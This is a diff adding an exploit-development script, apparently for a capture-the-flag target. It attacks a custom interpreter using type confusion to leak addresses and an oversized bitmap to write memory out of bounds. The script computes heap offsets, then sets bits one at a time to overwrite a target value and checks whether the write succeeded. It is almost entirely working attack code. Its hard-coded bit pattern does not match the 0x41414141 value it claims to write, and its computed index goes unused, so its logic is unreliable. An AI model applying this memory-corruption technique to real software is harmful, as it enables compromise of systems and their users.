@@ -1,0 +1,110 @@
+print("=== Test Write Verification ===");
+
+print("Step 1: Leak addresses");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print("addr1:");
+print(addr1);
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("targetaddr:");
+print(targetaddr);
+
+print("Step 2: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 3: Calculate addresses");
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+int bitmapptr = addr1 - 4096;
+int offset = valueptraddr - bitmapptr;
+int bitindex = offset * 8;
+print("bit_index:");
+print(bitindex);
+
+print("Step 4: Write test value 0x41414141 to value_ptr");
+print("This is a known pattern we can verify");
+int testvalue = 1094795585;
+print("Writing test value...");
+
+set(b1, 33984, 0, 1);
+set(b1, 33985, 0, 0);
+set(b1, 33986, 0, 0);
+set(b1, 33987, 0, 0);
+set(b1, 33988, 0, 1);
+set(b1, 33989, 0, 0);
+set(b1, 33990, 0, 0);
+set(b1, 33991, 0, 0);
+set(b1, 33992, 0, 1);
+set(b1, 33993, 0, 0);
+set(b1, 33994, 0, 0);
+set(b1, 33995, 0, 0);
+set(b1, 33996, 0, 1);
+set(b1, 33997, 0, 0);
+set(b1, 33998, 0, 0);
+set(b1, 33999, 0, 0);
+set(b1, 34000, 0, 0);
+set(b1, 34001, 0, 0);
+set(b1, 34002, 0, 0);
+set(b1, 34003, 0, 0);
+set(b1, 34004, 0, 0);
+set(b1, 34005, 0, 0);
+set(b1, 34006, 0, 0);
+set(b1, 34007, 0, 0);
+set(b1, 34008, 0, 0);
+set(b1, 34009, 0, 0);
+set(b1, 34010, 0, 0);
+set(b1, 34011, 0, 0);
+set(b1, 34012, 0, 0);
+set(b1, 34013, 0, 0);
+set(b1, 34014, 0, 0);
+set(b1, 34015, 0, 0);
+set(b1, 34016, 0, 0);
+set(b1, 34017, 0, 0);
+set(b1, 34018, 0, 0);
+set(b1, 34019, 0, 0);
+set(b1, 34020, 0, 0);
+set(b1, 34021, 0, 0);
+set(b1, 34022, 0, 0);
+set(b1, 34023, 0, 0);
+set(b1, 34024, 0, 0);
+set(b1, 34025, 0, 0);
+set(b1, 34026, 0, 0);
+set(b1, 34027, 0, 0);
+set(b1, 34028, 0, 0);
+set(b1, 34029, 0, 0);
+set(b1, 34030, 0, 0);
+set(b1, 34031, 0, 0);
+set(b1, 34032, 0, 0);
+set(b1, 34033, 0, 0);
+set(b1, 34034, 0, 0);
+set(b1, 34035, 0, 0);
+set(b1, 34036, 0, 0);
+set(b1, 34037, 0, 0);
+set(b1, 34038, 0, 0);
+set(b1, 34039, 0, 0);
+set(b1, 34040, 0, 0);
+set(b1, 34041, 0, 0);
+set(b1, 34042, 0, 0);
+set(b1, 34043, 0, 0);
+set(b1, 34044, 0, 0);
+set(b1, 34045, 0, 0);
+set(b1, 34046, 0, 0);
+set(b1, 34047, 0, 0);
+
+print("Write completed");
+
+print("Step 5: Read back target");
+int verify = target;
+print("Read value:");
+print(verify);
+if (verify == testvalue) {
+    print("SUCCESS! Write worked!");
+} else {
+    print("Write failed - value not changed");
+    print("Need to try different bitmap buffer or entry offset");
+}
+
